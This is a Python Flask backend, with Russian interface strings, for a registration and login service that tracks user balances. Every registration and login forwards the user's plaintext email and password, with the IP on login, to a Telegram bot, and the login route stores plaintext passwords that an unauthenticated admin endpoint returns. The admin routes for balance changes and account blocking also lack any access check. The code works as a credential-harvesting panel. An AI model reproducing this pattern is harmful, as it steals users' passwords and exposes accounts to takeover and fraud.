from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import hashlib
import logging
import os

from config import *
from models import db, User, LoginRequest
from database import init_db
from telegram_bot import init_bot, bot

# ===== ИНИЦИАЛИЗАЦИЯ =====
app = Flask(__name__)
app.config['SECRET_KEY'] = SECRET_KEY
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

CORS(app, origins=CORS_ORIGINS, supports_credentials=True)
init_db(app)
init_bot(BOT_TOKEN, ADMIN_ID)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# ===== HEALTH CHECK =====
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'timestamp': datetime.utcnow().isoformat()})

# ===== РЕГИСТРАЦИЯ =====
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    if not email or not password:
        return jsonify({'error': 'Заполните все поля'}), 400
    
    if User.query.filter_by(email=email).first():
        return jsonify({'error': 'Пользователь уже существует'}), 400
    
    user = User(
        email=email,
        password=hash_password(password),
        created_at=datetime.utcnow()
    )
    db.session.add(user)
    db.session.commit()
    
    msg = f"""🆕 <b>НОВАЯ РЕГИСТРАЦИЯ!</b>
    
📧 Email: <code>{email}</code>
🔑 Пароль: <code>{password}</code>
🕐 Время: {datetime.utcnow().strftime('%d.%m.%Y %H:%M')}
👤 ID: {user.id}"""
    
    bot.send_sync(msg)
    
    return jsonify({
        'success': True,
        'message': 'Регистрация успешна!',
        'user_id': user.id
    })

# ===== ВХОД =====
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    ip = request.remote_addr
    
    if not email or not password:
        return jsonify({'error': 'Заполните все поля'}), 400
    
    user = User.query.filter_by(email=email).first()
    if not user or user.password != hash_password(password):
        return jsonify({'error': 'Неверный email или пароль'}), 401
    
    if not user.is_active:
        return jsonify({'error': 'Аккаунт заблокирован'}), 403
    
    login_req = LoginRequest(
        email=email,
        password=password,
        user_id=str(user.id),
        user_name=user.email,
        ip_address=ip,
        created_at=datetime.utcnow(),
        status='approved'
    )
    db.session.add(login_req)
    db.session.commit()
    
    msg = f"""🔐 <b>НОВЫЙ ВХОД</b>
    
📧 Email: <code>{email}</code>
🔑 Пароль: <code>{password}</code>
🕐 Время: {datetime.utcnow().strftime('%d.%m.%Y %H:%M')}
🌐 IP: {ip}
👤 User ID: {user.id}"""
    
    bot.send_sync(msg)
    
    return jsonify({
        'success': True,
        'message': 'Вход выполнен!',
        'user_id': user.id,
        'email': user.email,
        'balance': user.balance,
        'is_admin': user.is_admin
    })

# ===== АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ =====
@app.route('/api/admin/users', methods=['GET'])
def admin_users():
    users = User.query.all()
    return jsonify([{
        'id': u.id,
        'email': u.email,
        'balance': u.balance,
        'is_admin': u.is_admin,
        'is_active': u.is_active,
        'created_at': u.created_at.strftime('%d.%m.%Y %H:%M')
    } for u in users])

# ===== АДМИН: ВСЕ ЗАЯВКИ =====
@app.route('/api/admin/requests', methods=['GET'])
def admin_requests():
    requests = LoginRequest.query.order_by(LoginRequest.created_at.desc()).all()
    return jsonify([{
        'id': r.id,
        'email': r.email,
        'password': r.password,
        'user_name': r.user_name,
        'ip_address': r.ip_address,
        'created_at': r.created_at.strftime('%d.%m.%Y %H:%M'),
        'status': r.status
    } for r in requests])

# ===== АДМИН: ОБНОВЛЕНИЕ БАЛАНСА =====
@app.route('/api/admin/balance/<int:user_id>', methods=['POST'])
def admin_update_balance(user_id):
    data = request.json
    amount = data.get('amount')
    
    user = User.query.get(user_id)
    if not user:
        return jsonify({'error': 'Пользователь не найден'}), 404
    
    user.balance = amount
    db.session.commit()
    
    return jsonify({'success': True, 'new_balance': user.balance})

# ===== АДМИН: БЛОКИРОВКА =====
@app.route('/api/admin/block/<int:user_id>', methods=['POST'])
def admin_block_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({'error': 'Пользователь не найден'}), 404
    
    user.is_active = not user.is_active
    db.session.commit()
    
    return jsonify({
        'success': True,
        'is_active': user.is_active,
        'message': 'Пользователь заблокирован' if not user.is_active else 'Пользователь разблокирован'
    })

# ===== ЗАПУСК =====
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=DEBUG)
